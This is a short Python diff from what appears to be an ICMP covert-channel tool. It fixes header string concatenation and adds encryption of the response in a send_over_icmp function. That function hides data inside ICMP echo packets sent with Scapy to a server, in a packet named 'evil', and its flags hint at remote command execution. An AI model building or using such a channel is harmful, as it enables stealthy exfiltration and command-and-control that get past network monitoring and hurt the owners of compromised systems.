@@ -11,11 +11,12 @@ def encrypt_decrypt(plaintext):
 
 def send_over_icmp(server, response, SSM, execute):
     header = ""
-    if SSM and execute: header + "###$1"
-    elif SSM and not execute: header + "###$0"
-    elif not SSM and execute: header + "###01"
-    elif not SSM and not execute: header + "###00"
-    else: header + "###__"
+    if SSM and execute: header += "###$1"
+    elif SSM and not execute: header += "###$0"
+    elif not SSM and execute: header += "###01"
+    elif not SSM and not execute: header += "###00"
+    else: header += "###__"
+    if SSM: response = encrypt_decrypt(response)
     serverresponse = header + response
     evil = IP(dst=server)/ICMP(type=8)/(serverresponse)
     send(evil)
